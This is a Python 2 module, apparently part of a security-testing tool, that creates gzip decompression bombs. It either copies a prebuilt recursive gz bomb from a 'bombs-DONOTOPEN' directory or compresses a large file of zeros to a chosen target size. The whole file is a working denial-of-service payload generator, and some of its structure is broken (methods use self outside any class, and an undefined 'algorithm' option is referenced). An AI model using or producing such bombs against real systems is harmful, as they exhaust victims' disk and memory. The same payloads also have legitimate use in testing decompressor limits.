import zipfile
import gzip
import os
import shutil
import tarfile
import logging
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Supported types are single_file, layer, and recursive')
options.add_option('input_budget', 500, 'Number of bytes in input budget')
options.add_option('target_size', 100000,
                   'Desired size of decompressed file; Not applicable to AC time exploits like recursive zip bombs')
options.add_option('output_file', 'output', 'Name of compressed file; Warning: Use at your own risk! Be careful!')

def run(self, generator, output):

    #TODO - do a check on output.OUTPUT_NAME, since it must be file

    if self.options['type'] == 'recursive':
        if int(self.options['input_budget']) > 250:
            shutil.copyfile(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/gz_recursive.gz',
                            self.options['output_file'] + '.gz')
            print 'Your gz bomb ' + self.options['output_file'] + '.gz is ready in your current directory.'
        else:
            logging.warning('We do not have a recursive gz bomb small enough.')

    elif self.options['type'] == 'single_file':
        self.singlefilebomb(generator, str(self.options['algorithm']), int(self.options['input_budget']),
                            int(self.options['target_size']), str(self.options['output_file']))

    elif self.options['type'] == 'layer':
        logging.warning('Coming soon.')

def generate_dummy_file(self,filename,size):
    with open(filename, 'w') as dummy:
        dummy.write((size*'0'))

def gz_compress_file(self,infile,outfile):
    with open(infile, 'rb') as f_in, gzip.open(outfile, 'wb') as f_out:
        shutil.copyfileobj(f_in, f_out)

def singlefilebomb(self, generator, algorithm, input_budget, target_size, output_file):
    # Writes a dummy file dummy.txt with target_size bytes of '0'.
    # Cleans up file at end of operation, probably not the cleanest way to do this.
    self.generate_dummy_file('dummy.txt',target_size)

    output_file_name = output_file+'.gz'
    self.gz_compress_file('dummy.txt', output_file_name)

    os.remove('dummy.txt')
    print 'Compressed file size: %d B' % os.stat(output_file_name).st_size
    print 'Uncompressed file size: %d B' % target_size

